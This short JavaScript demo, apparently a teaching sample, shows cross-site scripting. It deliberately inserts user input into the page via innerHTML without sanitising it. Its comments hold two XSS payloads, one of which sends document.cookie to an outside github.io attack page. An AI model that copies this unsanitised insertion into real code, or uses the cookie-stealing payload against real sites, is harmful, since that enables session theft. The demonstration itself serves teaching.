document.cookie = "userName=Irina"
document.cookie = "vblastvisit=1522413993"
document.cookie = "disqus_unique=780rb5t8pt6mg"

function testUserText (userText) {
  return userText
}
function insertUserText (userText) {
  var x = document.createElement('div')
  x.innerHTML = testUserText(userText)
  document.body.appendChild(x)
}

document.querySelector('input').onchange = function (event) {
  insertUserText(event.target.value)
}
// <IMG SRC=/ onerror="document.write(String.fromCharCode(88,83,83))"></img>
// <IFRAME SRC=js/attack.html onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' + document.cookie, '_self')"></IFRAME>
